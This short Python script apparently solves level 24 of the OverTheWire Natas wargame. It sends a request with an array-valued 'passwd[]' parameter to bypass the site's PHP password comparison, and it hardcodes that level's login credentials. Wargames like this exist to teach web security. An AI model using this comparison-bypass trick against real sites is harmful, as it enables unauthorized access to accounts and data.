#!/bin/python3
import requests
url = 'http://natas24.natas.labs.overthewire.org/?passwd[]=f'
r = requests.get(url,auth=('natas24','0xzF30T9Av8lgXhW7slhFCIsVKAPyl2r'),allow_redirects=False)
print(r.text)
